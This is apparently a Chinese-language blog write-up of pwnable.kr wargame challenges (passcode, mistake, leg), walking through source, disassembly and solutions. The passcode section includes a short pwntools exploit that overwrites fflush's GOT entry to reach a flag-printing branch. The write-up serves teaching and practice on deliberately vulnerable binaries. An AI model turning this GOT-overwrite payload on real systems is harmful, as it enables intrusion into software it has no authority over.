<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	unsigned int random;</span><br><span class="line">	random = rand();</span><br><span class="line">	printf(&quot;first is %p\n&quot;,random);</span><br><span class="line">	for(int i =0;i&lt;10;i++)&#123;</span><br><span class="line">		srand(i);			</span><br><span class="line">		random = rand();</span><br><span class="line">		printf(&quot;num %d is %p\n&quot;,i,random);</span><br><span class="line">		&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./te </span><br><span class="line">first is 0x6b8b4567</span><br><span class="line">num 0 is 0x6b8b4567</span><br><span class="line">num 1 is 0x6b8b4567</span><br><span class="line">num 2 is 0x59b997fa</span><br><span class="line">num 3 is 0x47db4e3a</span><br><span class="line">num 4 is 0x754e7ddd</span><br><span class="line">num 5 is 0x232add1b</span><br><span class="line">num 6 is 0x11560ebd</span><br><span class="line">num 7 is 0x3e52dff5</span><br><span class="line">num 8 is 0x2d274378</span><br><span class="line">num 9 is 0x1a7dd803</span><br></pre></td></tr></table></figure>

<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>先把这个文件<code>scp</code>下载下来，<code>scp -P 2222  passcode@pwnable.kr:/home/passcode/passcode /home/pic/Desktop</code>，pwnable上的ssh端口全都改成了2222，所以需要指定一下，下来后我们先研究一下漏洞点，c文件如下</p>
<blockquote>
<p>Safeguard、operation and source code</p>
</blockquote>
<p>ssh连接上去后直接运行后发现出错，我们使用<strong>scp</strong>命令从服务器下载下来源码和程序进行进一步逆向分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 ./passcode </span><br><span class="line">Toddler&#x27;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : 1</span><br><span class="line">Welcome 1!</span><br><span class="line">enter passcode1 : 1</span><br><span class="line">[1]    7138 segmentation fault (core dumped)  ./passcode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void login()&#123;</span><br><span class="line">	int passcode1;</span><br><span class="line">	int passcode2;</span><br><span class="line"></span><br><span class="line">	printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;passcode1);</span><br><span class="line">	fflush(stdin);</span><br><span class="line"></span><br><span class="line">	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span><br><span class="line">	printf(&quot;enter passcode2 : &quot;);</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;passcode2);</span><br><span class="line"></span><br><span class="line">	printf(&quot;checking...\n&quot;);</span><br><span class="line">	if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;</span><br><span class="line">                printf(&quot;Login OK!\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">                printf(&quot;Login Failed!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void welcome()&#123;</span><br><span class="line">	char name[100];</span><br><span class="line">	printf(&quot;enter you name : &quot;);</span><br><span class="line">	scanf(&quot;%100s&quot;, name);</span><br><span class="line">	printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	// something after login...</span><br><span class="line">	printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The program has a format string vulnerability</p>
</blockquote>
<p><code>scanf(&quot;%d&quot;, passcode1)</code></p>
<p>想要利用这个漏洞很简单，这个漏洞原理就是如果不加&amp;，scanf就会<strong>默认从栈中读取4字节当成passcode1的地址</strong>（好草率的说）<br>于是思路有了，就是把某个函数GOT地址改成<code>system(&quot;/bin/cat flag&quot;)</code>这个后门函数即可成功看到flag：）</p>
<p>思路如下：</p>
<ul>
<li>知道name和passcode1的偏移</li>
<li>找到fflush函数的GOT地址</li>
<li>找到我们的后门函数地址</li>
<li>利用本程序漏洞写出利用代码</li>
</ul>
<blockquote>
<p>Write exp</p>
</blockquote>
<p>首先利用ida查出name和passcode1的偏移，我们发现这两个变量在welcome和login中使用，两次函数的<strong>提高堆栈</strong>的操作相同，于是我们知道这两个栈使用了同一个<strong>ebp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, offset a100s ; &quot;%100s&quot;</span><br><span class="line">lea     edx, [ebp+var_70]</span><br><span class="line">mov     [esp+4], edx</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, offset aD  ; &quot;%d&quot;</span><br><span class="line">mov     edx, [ebp+var_10]</span><br><span class="line">mov     [esp+4], edx</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    ___isoc99_scanf</span><br></pre></td></tr></table></figure>
<p>使用objdump看一下GOT表</p>
<p><code>objdump -R passcode</code></p>
<p>读一下GOT表后找到</p>
<p><code>0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0</code></p>
<p>该函数在输入passcode后自动调用，直接更改这个函数就行！通过ida看到后门函数地址</p>
<p><code>080485E3 mov     dword ptr [esp], offset command ; &quot;/bin/cat flag</code></p>
<p>万事具备，编写exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./passcode&#x27;)</span><br><span class="line">fflush_got_addr = 0x0804a004</span><br><span class="line">flag_addr = 0x080485E3</span><br><span class="line">payload = &#x27;a&#x27; * 96 + p32(fflush_got_addr) + str(flag_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这样写并不优雅，可能部分人会认为怎么payload直接就输进去了？？其实这只是凑巧了，96个字节的<code>a</code>加上之后的<code>p32(fflush_got_addr)</code>正好是100个开辟的name大小，应该是这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sleep(1)</span><br><span class="line">payload = &#x27;a&#x27; * 96 + p32(fflush_got_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">payload = str(flag_addr)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>效果相同，我们用一个小demo具体说明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void world()&#123;</span><br><span class="line">	int passcode1;</span><br><span class="line">	printf(&quot;enter passcode1 : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;passcode1);</span><br><span class="line">	printf(&quot;%d\n&quot;,passcode1);</span><br><span class="line">&#125;</span><br><span class="line">void hello()&#123;</span><br><span class="line">	char name[5];</span><br><span class="line">	printf(&quot;enter you name : &quot;);</span><br><span class="line">	scanf(&quot;%5s&quot;, name);</span><br><span class="line">	printf(&quot;Welcome %s!\n&quot;, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">	hello();</span><br><span class="line">	world();</span><br><span class="line">	return 0;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./flag</span><br><span class="line">enter you name : 123456</span><br><span class="line">Welcome 12345!</span><br><span class="line">enter passcode1 : 6</span><br></pre></td></tr></table></figure>
<p>大致是这意思😀</p>
<blockquote>
<p>深入分析pwnable.kr上的题系列[四]</p>
</blockquote>
<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>本题的关键就是符号优先性，我们写个demo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	int test;</span><br><span class="line">	if(test = -1&lt;0)</span><br><span class="line">		printf(&quot;%d\n&quot;,test);</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;??what happened\n&quot;);</span><br><span class="line">	printf(&quot;%d\n&quot;,test);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./c</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>我们通过小demo看出来，其实并不是先赋值，而是先执行<code>&lt;</code>在执行<code>=</code>，即<code>test=(-1&lt;0)</code></p>
<p>我们分析一下源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define PW_LEN 10</span><br><span class="line">#define XORKEY 1</span><br><span class="line"></span><br><span class="line">void xor(char* s, int len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for(i=0; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	</span><br><span class="line">	int fd;</span><br><span class="line">	if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;  //open函数以只读方式打开，错误则返回-1，if语句成立，向下执行</span><br><span class="line">		printf(&quot;can&#x27;t open password %d\n&quot;, fd); //fd只能是1</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">  //fd为0向下执行</span><br><span class="line">	printf(&quot;do not bruteforce...\n&quot;);</span><br><span class="line">	sleep(time(0)%20);</span><br><span class="line"></span><br><span class="line">	char pw_buf[PW_LEN+1];</span><br><span class="line">	int len;</span><br><span class="line">	if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;  //标准读入，输入即可</span><br><span class="line">		printf(&quot;read error\n&quot;);</span><br><span class="line">		close(fd);</span><br><span class="line">		return 0;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	char pw_buf2[PW_LEN+1];</span><br><span class="line">	printf(&quot;input password : &quot;);</span><br><span class="line">	scanf(&quot;%10s&quot;, pw_buf2);</span><br><span class="line"></span><br><span class="line">	// xor your input</span><br><span class="line">	xor(pw_buf2, 10);</span><br><span class="line"></span><br><span class="line">	if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		printf(&quot;Password OK\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Wrong Password\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以分析到这种程度输入就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@prowl:~$ ./mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">0000000000</span><br><span class="line">input password : 1111111111</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure>


<blockquote>
<p>深入分析pwnable.kr上的题系列[五]</p>
</blockquote>
<h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><p>看到本题是arm汇编，我们直接看看c代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int key=0;</span><br><span class="line">	printf(&quot;Daddy has very strong arm! : &quot;);</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line">	if( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">		printf(&quot;Congratz!\n&quot;);</span><br><span class="line">		int fd = open(&quot;flag&quot;, O_RDONLY);</span><br><span class="line">		char buf[100];</span><br><span class="line">		int r = read(fd, buf, 100);</span><br><span class="line">		write(0, buf, r);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;I have strong leg :P\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>emmm，看不太懂，只知道<code>key1()+key2()+key3()) == key</code>则得到flag，直接撸汇编吧，挨个分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int key1()&#123;</span><br><span class="line">	asm(&quot;mov r3, pc\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>key1函数汇编层面只是多作了一个栈的处理，我们只需要知道pc寄存器的值，且其有读写限制，当没有超过读取限制的时候，读取的值是指令的地址加上8个字节，故返回值r0（arm返回值为r0）为0x00008ce4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot;</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们仔细对照一下汇编和使用asm编的代码，发现有这个<code>.code 16</code>和<code>.code 32</code>，这是啥？？google一波发现是告诉编译器代码是arm状态还是thumb状态，不过和这题没什么关系</p>
<p>我们按行注释一下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x00008cfc &lt;+12&gt;:	add	r6, pc, #1  //r6=0x00008d05</span><br><span class="line">0x00008d00 &lt;+16&gt;:	bx	r6  //跳转到r6的指向，但地址会先和0xFFFFFFFE按位与，相当于jmp 0x00008d04（最后一位必为偶数）</span><br><span class="line">0x00008d04 &lt;+20&gt;:	mov	r3, pc  //r3=0x00008d08</span><br><span class="line">0x00008d06 &lt;+22&gt;:	adds	r3, #4  //r3=0x00008d0c</span><br><span class="line">0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">0x00008d10 &lt;+32&gt;:	mov	r0, r3  //返回值r0=r3</span><br></pre></td></tr></table></figure>
<p>结束战斗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int key3()&#123;</span><br><span class="line">	asm(&quot;mov r3, lr\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>key3就是一个简单的lr寄存器当返回值，lr寄存器有两个用处</p>
<ul>
<li>保存子程序返回地址</li>
<li>异常发生时，异常模式的r14用来保存异常返回地址</li>
</ul>
<p>所以返回地址为<code>   0x00008d80 &lt;+68&gt;:	mov	r3, r0</code>，的<strong>0x00008d80</strong></p>
<p>我们得到了三个返回值，直接相加即为key，为0x00008ce4+0x00008d0c+0x00008d80&#x3D;108400，程序分析完毕，我们再来看看刚才提到的两个状态</p>
<h2 id="ARM处理器状态"><a href="#ARM处理器状态" class="headerlink" title="ARM处理器状态"></a>ARM处理器状态</h2><p>我们分析key2的时候发现gdb反编译出莫名奇妙的几行，我们深入分析一下源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int key2()&#123;</span><br><span class="line">	asm(</span><br><span class="line">	&quot;push	&#123;r6&#125;\n&quot;</span><br><span class="line">	&quot;add	r6, pc, $1\n&quot;</span><br><span class="line">	&quot;bx	r6\n&quot; 	//①</span><br><span class="line">	&quot;.code   16\n&quot;</span><br><span class="line">	&quot;mov	r3, pc\n&quot;</span><br><span class="line">	&quot;add	r3, $0x4\n&quot;</span><br><span class="line">	&quot;push	&#123;r3&#125;\n&quot;</span><br><span class="line">	&quot;pop	&#123;pc&#125;\n&quot;</span><br><span class="line">	&quot;.code	32\n&quot;	//②</span><br><span class="line">	&quot;pop	&#123;r6&#125;\n&quot;</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到了处理①的时候下一行就是状态的切换了，之前我们知道了地址在跳转之前会和<strong>0xFFFFFFFE</strong>进行按位与，本身最后一位的作用是起到了一个标志位的作用，0代表状态arm，1代表状态thumb，所以才会显得很奇怪的加一，而最后②的转换回来考虑到lr寄存器放入的就是原本地址，故执行完<code>   0x00008d1c &lt;+44&gt;:	bx	lr</code>后程序又切换会了arm状态</p>
